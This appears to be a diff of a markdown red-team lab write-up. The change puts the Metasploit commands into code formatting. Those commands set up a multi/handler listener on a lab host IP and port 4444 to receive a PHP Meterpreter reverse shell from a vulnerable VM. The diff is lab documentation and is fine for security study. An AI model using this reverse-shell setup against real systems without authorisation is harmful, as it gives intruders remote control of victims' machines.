@@ -40,17 +40,17 @@ Acted as a red team to attack a vulnerable VM within my environment, ultimately 
 
 - Before we run it we will want to run Metasploit to listen to the reverse shell on our host machine to access it remotely.
 - The commands would be used in this order to begin the listening 
-   - Msfconsole -q
-   - Use exploit/multi/handler
-   - Set payload php/meterpreter/reverse_tcp 
+   - `msfconsole -q`
+   - `use exploit/multi/handler`
+   - `Set payload php/meterpreter/reverse_tcp` 
       - (same payload script as the one we copied to the shared directory)
-   - Set LHOST 192.168.1.90
+   - `Set LHOST 192.168.1.90`
       - Ip of machine we want to listen on 
-   - Set LPORT 4444
+   - `Set LPORT 4444`
       - Port we want to listen on
-   - Show options 
+   - `Show options` 
       - To see if all the settings we had set are correct
-   - Run
+   - `run`
       - To execute the listening process
  
  ![bc35031f4a1536c75c80faa31941456e](https://user-images.githubusercontent.com/61332852/137391217-c0c8f352-de04-4f7c-b3fb-5722b93771b1.png)
